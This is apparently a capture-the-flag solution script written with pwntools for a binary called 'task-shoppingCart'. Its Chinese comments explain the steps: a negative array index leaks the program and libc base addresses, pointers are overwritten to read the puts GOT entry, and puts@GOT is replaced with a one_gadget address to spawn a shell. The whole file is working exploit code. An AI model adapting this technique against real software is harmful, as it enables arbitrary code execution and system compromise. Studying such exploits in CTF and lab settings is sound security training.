from pwn import *

context.log_level = 'debug'

p = process("./task-shoppingCart")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def Break():
	p.recvuntil("EMMmmm, you will be a rich man!")
	p.sendline("3")

def Modify(index,payload):
	p.recvuntil("Now, buy buy buy!")
	p.sendline("3")
	p.recvuntil("Which goods you need to modify?")
	p.sendline(index)
	p.recvuntil("to?")
	p.sendline(payload)

def Free(index):
	p.recvuntil("Now, buy buy buy!")
	p.sendline("2")
	p.recvuntil("Which goods that you don't need?")
	p.sendline(index)
	p.recvuntil("You really don't need it?")


def Buy(length,name):
	p.recvuntil("Now, buy buy buy!")
	p.sendline("1")
	p.recvuntil("How long is your goods name?")
	p.sendline(length)
	p.recvuntil("What is your goods name?")
	p.sendline(name)

def Shop(payload):
	p.recvuntil("EMMmmm, you will be a rich man!")
	p.sendline("1")
	p.recvuntil("RMB or Dollar?")
	p.sendline(payload)

if __name__=="__main__":
	for i in range(0,0x4):
		payload = "AAAAAAA"
		Shop(payload)
#leak the address
	Break()
	#Modify(str(-47),"AAAAAAA")
	p.recvuntil("Now, buy buy buy!")
	p.sendline("3")
	p.recvuntil("Which goods you need to modify?")
	p.sendline(str(-47)) #数组下标溢出，访问到.data上的数据
	p.recvuntil("modify ")
	leak_base = u64(p.recv(6).ljust(8,'\0'))-0x202068 #泄露off_202068处的地址，从而泄露加载基址
	#print "leak_addr" +  p64(leak_addr)
	print hex(leak_base)
	p.sendline(p64(leak_base+0x202068))
	put_got = leak_base + 0x202020
	
	print "put_got", hex(put_got)

	Modify(str(-0x14),p64(leak_base+0x2020a8)) #修改money[0]为money[1]的地址
	Modify(str(-0x13),p64(put_got)) #修改money[1]修改为puts_got表地址

	
	p.recvuntil("Now, buy buy buy!")
	p.sendline("3")
	p.recvuntil("Which goods you need to modify?")
	p.sendline(str(-0x28))
	p.recvuntil("modify ")
	leak_puts = u64(p.recv(6).ljust(8,'\0'))
	
	one_gadget = 0x45216
	p.sendline(p64(leak_puts-libc.symbols['puts']+ one_gadget))#使用onegadget填充puts_got表项
	print "leak_puts",hex(leak_puts)

	
	#gdb.attach(p)
	 
	p.interactive()




